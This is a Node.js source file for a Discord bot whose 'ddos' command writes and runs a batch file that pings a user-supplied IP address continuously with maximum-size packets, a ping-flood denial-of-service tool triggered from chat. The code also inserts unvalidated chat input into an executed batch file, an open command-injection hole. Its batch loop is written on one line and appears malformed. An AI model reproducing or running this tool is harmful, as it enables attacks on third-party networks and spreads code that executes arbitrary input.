const Discord = require("discord.js");
const config = require("./config.json");
const fs = require('fs');

const bot = new Discord.Client();

bot.on("ready", () => {
  console.log(`Bot is up.`);
});

bot.on("message", async message => {
  if(message.author.bot) return;
  if(message.content.indexOf(config.prefix) !== 0) return;
  const args = message.content.slice(config.prefix.length).trim().split(/ +/g);
  const command = args.shift().toLowerCase();

  if(command === "ddos") {
  if (!args) return message.reply('Must enter an IP for me to ping DDos.');

  message.channel.send('**Ping DDosing started.**')

  fs.writeFile('core.bat', `:discord ping ${args} -t -l 65500 goto :discord`, function (err) {
  if (err) throw err;
  });

  require('child_process').exec('cmd /c core.bat', function(){
 });

}
});

bot.login(config.token);